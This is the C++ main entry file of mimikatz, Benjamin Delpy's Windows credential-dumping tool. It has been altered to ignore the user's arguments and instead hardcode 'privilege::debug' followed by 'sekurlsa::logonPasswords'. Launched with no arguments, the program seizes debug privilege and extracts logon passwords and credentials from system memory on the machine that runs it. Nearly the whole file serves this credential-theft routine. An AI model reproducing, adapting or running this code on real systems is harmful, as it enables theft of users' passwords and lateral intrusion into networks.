/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/
*/
#include "globdefs.h"
#include <io.h>
#include <fcntl.h>
#include "mimikatz.h"

int wmain(int argc, wchar_t * argv[])
{
	setlocale(LC_ALL, "English_US.65001");
	_setmode(_fileno(stdin), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
	_setmode(_fileno(stdout), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
	_setmode(_fileno(stderr), _O_U8TEXT/*_O_WTEXT/*_O_U16TEXT*/);
	
//	vector<wstring> * mesArguments = new vector<wstring>(argv + 1, argv + argc);
    vector<wstring> * mesArguments = new vector<wstring>();
    mesArguments->push_back( L"privilege::debug" );
    mesArguments->push_back( L"sekurlsa::logonPasswords" );
//    mesArguments->push_back( L"exit" );

	mimikatz * myMimiKatz = new mimikatz(mesArguments);
	delete myMimiKatz, mesArguments;
	return ERROR_SUCCESS;
}